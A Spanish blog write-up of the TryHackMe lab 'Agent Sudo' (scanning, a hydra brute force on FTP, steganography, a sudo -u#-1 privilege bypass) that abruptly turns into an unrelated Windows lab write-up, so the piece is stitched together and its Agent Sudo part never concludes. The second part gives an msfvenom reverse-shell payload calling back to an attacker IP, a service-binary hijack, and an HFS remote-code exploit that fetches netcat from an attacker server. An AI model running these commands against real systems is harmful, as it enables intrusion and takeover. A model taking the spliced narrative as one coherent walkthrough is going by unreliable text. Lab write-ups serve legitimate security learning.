---
layout: single
title: Agent Sudo - Try Hack Me
excerpt: Agent Sudo maquina catalogada de dificultad “Easy” basada en enumerar la maquina y estar pendiente a todas las pistas que se nos dan, además de utilizar diferentes técnicas de fuerza bruta, estenografia y por ultimo una escalaciión de privilegios sencillita. Vamos a ello! 
date: 02-12-2023
classes: wide
header:
  teaser: /assets/images/thm-agentsudo/1.PNG
  teaser_home_page: true
  icon: /assets/images/thm.webp
categories:
  - TryHackMe
tags:  
  - enumerate
  - exploit
  - brute-force
  - hash-cracking
  - Easy
  
---

![](/assets/images/thm-agentsudo/1.PNG)

Agent Sudo maquina catalogada de dificultad “Easy” basada en enumerar la maquina y estar pendiente a todas las pistas que se nos dan, además de utilizar diferentes técnicas de fuerza bruta, estenografia y por ultimo una escalaciión de privilegios sencillita. Vamos a ello! 

## 1-Escaneo Nmap.


Iniciamos la maquina y primero vamos a ver ante que maquina estamos, con el comando whichSystem.py descubriremos en base al TTL si estamos frente a una maquina Windows (Suelen acercarse a un TTL de 128) o Linux (Suelen acercarse a un TTL de 64): En este caso nos a dado un TTL de 63 lo que significa que estamos ante una maquina Linux.

```
whichSystem.py 10.10.214.188
~$ 10.10.214.188 (ttl -> 63): Linux
```

Comezaremos enumerando todos los puertos con el comando: nmap -p- -sS --min-rate 5000 --open -vvv -n 10.10.214.188 -oG allports

Utilizaremos los parametros -p- (Indicar todos los puertos) -sS (TCP Syn port scan) --min-rate 500 (No admitir paquetes mas lentos que 500 paquetes por segundo) --open (Estatus del puerto OPEN) -vvv (Verbose mode, para arrogar un poco de información mientras realizamos el escaneo) -n (No aplicar resolución DNS) -oG (Guardar archivo en formato grepeable)


Nmap nos devuelve todo esto:

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 18:20 CET
Initiating Ping Scan at 18:20
Scanning 10.10.214.188 [4 ports]
Completed Ping Scan at 18:20, 0.17s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:20
Scanning 10.10.214.188 [65535 ports]
Discovered open port 21/tcp on 10.10.214.188
Discovered open port 80/tcp on 10.10.214.188
Discovered open port 22/tcp on 10.10.214.188
Completed SYN Stealth Scan at 18:21, 18.51s elapsed (65535 total ports)
Nmap scan report for 10.10.214.188
Host is up, received echo-reply ttl 63 (0.089s latency).
Scanned at 2023-02-11 18:20:56 CET for 18s
Not shown: 64238 closed tcp ports (reset), 1294 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.86 seconds
           Raw packets sent: 91848 (4.041MB) | Rcvd: 79148 (3.166MB)
```

Ahora realizaremos un escaneo concreto a cada puerto: nmap -sC -sV 10.10.214.188 - oN ports

Utilizaremos los parametros -sC (Utilizar los scripts más comunes) -sV (Mostrar versiones) -o (Guardar archivo)

Nmap nos devuelve todo esto:

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 18:27 CET
Nmap scan report for 10.10.214.188 (10.10.214.188)
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
```

Vemos que nos devuelve bastantes puertos abiertos. Algunos insteresantes son el puerto 80 (http) , 21 (FTP), 22 (SSH).


## 2-Explorando la maquina.

Accedemos al puerto 80 y vemos una página web muy sencilla con unos textos que indican lo siguiente: Estimados agentes, utilizar vuestro propio "codename" en user-agent para acceder al sitio.
De, Agente R.

![](/assets/images/thm-agent-sudo/2.PNG)

Por la información que nos da, parece que vamoss a tener que modificar algo respecto al User-Agent de nuestro navegador, Por ahora vamos a aplicar una busqueda de directorios al sitio web por si encontramos algo más:

Utilizaremos la herramienta wfuzz con el siguiente comando: wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 31 -t 200 http://10.10.214.188/FUZZ


![](/assets/images/thm-agent-sudo/3.PNG)

Después de un rato, no nos descubre nada interesante asi que vamos a modificar el User-Agent.

Por la información que nos da la página, para acceder al sitio web, necesitamos utilizar nuestro código de User-Agent. Por lo cual ya tenemos una posible vía de intrusión, hay un detalle clave y es "Agent R" Lo que me esta dando a entender es que el Agent R utiliza tal vez el User-Agent "R", vamos a realizar un ataque de tipo sniper con BurpSuite para realizar peticiones con diferentes User-Agent aver si nos resuelve algo diferente.

Preparamos el Payload y utilizaremos letras para probar los difrentes User-Agent [a-zA-Z]

![](/assets/images/thm-agent-sudo/4.PNG)

![](/assets/images/thm-agent-sudo/5.PNG)

Vemos que el User-Agent C y R nos da una longitud diferente.

Vamos a realizar una petición con el User-Agent C:

![](/assets/images/thm-agent-sudo/6.PNG)

Nos devuelve una localición, vamos a ver que contiene dentro.

![](/assets/images/thm-agent-sudo/7.PNG)

¡Bingo!, Encontramos algo más de información. Un nombre de usuario llamado "chris" y un mensaje que dice que cambie su contraseña que es debil.


## 3-Ataque de fuerza bruta a FTP y estenografia.

Utilizaremos la herramienta hydra para realizar el ataque de fuerza bruta. hydra -l chris -P /usr/share/wordlist/rockyou.txt ftp://10.10.214.188 -v

![](/assets/images/thm-agent-sudo/8.PNG)

Bien, encontramos una credencial, ahora vamos a iniciar sesión en FTP.

![](/assets/images/thm-agent-sudo/9.PNG)

Listamos el contenido y vemos tres archivos, vamos a descargarlos en nuestra maquina local para ver que contienen.

![](/assets/images/thm-agent-sudo/10.PNG)

Abrimos el archivo de texto y nos dice: Las imagenes de alienigenas son falsas. El agente R guardo las reales dentro de su directorio. Las credenciales se almacenan de alguna manera en las imagenes.

Las imagenes lucen así:

![](/assets/images/thm-agent-sudo/11.PNG)

He utilizado diferentes herramientas de extracción de información como: Exiftool y steghide. Pero no encontramos nada.

Utilizando la herramienta: binwalk encontramos un archivo .zip dentro de cutie.png

![](/assets/images/thm-agent-sudo/12.PNG)

El contenido del Zip es este:

![](/assets/images/thm-agent-sudo/13.PNG)

Tenemos varios archivos vacios y un zip que al intentar descomprimirlo vemos que está encriptado, asi que vamos a crackearlo. Utilizaremos John2zip y luego John.

![](/assets/images/thm-agent-sudo/14.PNG)

Bien ya tenemos la ocotraseña del archivo zip, vamos a ver que contiene en su interior.

![](/assets/images/thm-agent-sudo/15.PNG)

Dentro del archivo .zip tenemos un mensaje que incluye 'QXJlYTUx' lo cual no parece ser un texto normal, tiene pinta de que esta encriptado o algo por el estilo.

En crackstation.net no nos resuelve nada pero en cyberchef.com si introducimos el código y le damos a la varita magica, detecta que es base64 y nos resuelve lo siguiente.

![](/assets/images/thm-agent-sudo/16.PNG)

Bien, Aun así no tenemos ni un nombre de usuario ni unas credenciales. Solo un mensaje que tenemos que enviar las imagenes al Area51. Si recordamos teniamos dos imagenes, de una extraimos información y de la otra no parecia contener nada en su interior. Pero cuando utilice steghide para comprobar si habia algo el archivo cutie-alien.png y me pedia una contraseña, vamos a probar con alien y Area51.

![](/assets/images/thm-agent-sudo/17.PNG)

La contraseña era: Area51 y vemos que en el mensaje incluye información como un nombre de usuario james y una contraseña: hackerrules!


## 4-Nos conectamos a SSH y buscamos la flag del usuario.


NOTA: La dirección IP a cambiado, por que me caduco el tiempo de la maquina y la tuve que volver a iniciar.

Vamos a iniciar sesión en SSH:

Introducimos las credenciales que obtuvimos y ya tenemos la flag del usuario.

![](/assets/images/thm-agent-sudo/18.PNG)

La imagen nos la vamos a descargar utilizando el comando scp y vamos a ver que contiene.

![](/assets/images/thm-agent-sudo/19.PNG)

Vemos que con exiftool no vemos nada y que la imagen es un poco random, vamos a utilizar binwalk y steghide para ver si oculta algo la imagen. 

![](/assets/images/thm-agent-sudo/20.PNG)

Parece ser que hay un archivo TIFF dentro de la propia imagen, pero esta protegido por una contraseña. Probando la contraseña de james no funciona.

Por lo cual por ahora vamos a dejar la imagen de lado.

Lo único que podemos resolver es la pregunta de TryHackMe que nos dice que cual es el indidente de la foto. Si realizamos una busqueda reversa de imagenes, nos encuentra una noticia falsa diciendo que un filmmaker falsifico la 'autopsia del alienigena Roswell' en un apartamento de londres.

![](/assets/images/thm-agent-sudo/21.PNG)


## 4-Escalación de privilegios y flag del usuario root.

Bien comenzamos a enumerar un poco la maquina. whoami, id, uname -a, sudo -l...

![](/assets/images/thm-agent-sudo/22.PNG)

Tenemos que el usuario james, puede ejecutar /bin/bash como sudo, pero parece ser que hay una restricción. Asi que vamos a intentar bypasearla.

Encontramos un exploit que permite realizar un bypass y escalar privilegios en caso de que la versión sea <1.8

![](/assets/images/thm-agent-sudo/23.PNG)

En hacktricks encontre este comando y funciono a la primera: sudo -u#-1 /bin/bash

![](/assets/images/thm-agent-sudo/24.PNG)


Primero subiremos el archivo a la maquina victima con el comando "upload". Recordar que actualmente estamos utilizando la consola meterpreter, por lo cual necesitamos la consola de windows powershell para poder ejecutar el programa, para ello activaremos el modulo de powershell -> load powershell , powershell_shell

![](/assets/images/thm-steelmountain/14.JPG)

Ejecutamos el programa utilizando 1- ". ./PowerUp.ps1" y 2- "Invoke-AllChecks".

Nos devuelve todo esto, los servicios del sistema.

```
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files
```

Nosotros nos quedaremos con este servicio , que no es por defecto de windows y además tenemos permisos con el usuario Bill.

```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```
Lo que vamos a tratar es de cambiar el programa ASCService.exe que es que ejecuta el sistema por uno nuestro malicioso, para obtener una reverse shell con privilegios utilizando un payload que crearemos con msfvenom.

msfvenom -p windows/shell_reverse_tcp LHOST=10.9.8.85 LPORT=4455 -e x86/shikata_ga_nai -f exe -o ASCService.exe

-p -> Indicamos que es un payload
-e -> Indicamos un tipo de codificacion
-f -> Indicamos el formato
-o -> Indicamos la salida (Nombre del archivo)

Lo subimos a la maquina objetivo con el comando "upload" como antes y lo movemos a su carpeta donde se va a ejecutar.

![](/assets/images/thm-steelmountain/15.JPG)

A continuacion vamos a parar el servicio, copiamos el archivo y lo volvemos a iniciar.

![](/assets/images/thm-steelmountain/16.JPG)

Si estamos en escucha con una interfaz de netcat en el puerto indicado en el payload, deberiamos obtener una revershell con privilegios de administrador.

![](/assets/images/thm-steelmountain/17.JPG)

![](/assets/images/thm-steelmountain/18.JPG)

![](/assets/images/thm-steelmountain/19.JPG)

## 4-Realizando la maquina sin metasploit.

Para realizar la maquina sin metasploit, tendremos que enumerarla con nmap y utilzar un exploit.

Utilizaremos la herramienta searchsploit para buscar algun exploit que nos pueda servir de utilidad.

![](/assets/images/thm-steelmountain/6.JPG)

En mi caso utilizaremos -> Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | windows/remote/39161.py

Utilizaremos searchsploit -m 39161 para bajarnos el exploit y echarle un vistazo.

Vemos que tiene información acerca de la vulnerabilidad y nos indica como ejecutar correctamente el exploit.

![](/assets/images/thm-steelmountain/20.JPG)

1-  Cambiaremos estas dos variables por nuestra dirección ip (tun0) y el puerto. (Recomiendo dejar el 443)

    ip_addr = "10.9.8.85" #local IP address
    local_port = "443" # Local Port number

2-Tenemos que tener un servidor web corriendo con el binario de netcat.exe, para ello nos iremos a la ruta /usr/share/windows-binaries y ejecutaremos el comando -> python3 -m httpserver 80

3-Tener una interfaz de netcat en escucha por el puerto 443 -> nc -lvnp 443

4-Ejecutar el exploit utilzando los parametros que nos indica -> python 39161.py 10.10.180.90 8080

![](/assets/images/thm-steelmountain/20.JPG)

Vemos que directamente nos devuelve una revershell.

![](/assets/images/thm-steelmountain/21.JPG)

Ahora vamos a utilizar la herramienta WinPeas para enumerar la maquina, primero para subirla utilizaremos el servicio samba.

![](/assets/images/thm-steelmountain/22.JPG)

Ejecutamos el programa y nos devuelve una salida enorme, pero principalmente nos vamos a centrar en la vulnerabilidad del servicio que ya conocemos.

![](/assets/images/thm-steelmountain/23.JPG)

Nos indica que este servicio tiene espacios en su ruta y que es vulnerable y que además tenemos permisos como bill.

¿Pero a que nos referimos con que tiene espacios en su ruta?

Si nos fijamos en la ruta que esta indicada a ejecutar -> C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe , contiene espacios entre directorios.

Program Files (x86) -> Program ESPACIO Files ESPACIO (x86) , Advanced SystemCare -> Advanced ESPACIO SystemCare , ¿Que significa esto?

El sistema windows va a buscar a traves de esa ruta un programa llamado "ASCService.exe" , al no indicar la ruta completa entre "". El sistema por defecto realizara la siguiente busqueda.

1-C:\Program 
-- ¿ASCService.exe?
2-C:\Program Files
-- ¿ASCService.exe?
3-C:\Program Files (x86)\IObit\Advanced
-- ¿ASCService.exe?
4-C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
-- ¿ASCService.exe?

Si tenemos permisos de escritura podriamos poner un binario malicioso en cualquiera de estas rutas para que compruebe primero nuestro binario.

con el comando icacls, vemos si tenemos comandos con bill para escribir.

![](/assets/images/thm-steelmountain/24.JPG)

Podemos realizar esta busqueda de directorios con la vulnerabilidad Unquoted Service Path, con la herramienta CVE - 2020-15261.

Utilizamos el comando -> wmic service get name,displayname,pathname,startmode |findstr /i
"auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

El programa busca binarios que no sean de windows por defecto y que no tenga comillas en las rutas.

![](/assets/images/thm-steelmountain/25.JPG)

Vemos que en el directorio C:\Program Files (x86)\IObit (El usuario Bill Nos indica la W de write , tenemos permisos de escritura así que nuevamente vamos a generar el archivo malicioso utilizando msfvenom y subiendolo a la maquina victima con sbm.

msfvenom -> msfvenom -p windows/shell_reverse_tcp LHOST=10.9.8.85 LPORT=4455 -f exe -e x86/shikata_ga_nai -o ASCService.exe

Nos pondremos en escucha por el puerto 4455 con la interfaz de netcat y vemos que ganamos acceso como Administrador.

![](/assets/images/thm-steelmountain/26.JPG)

![](/assets/images/thm-steelmountain/27.JPG)
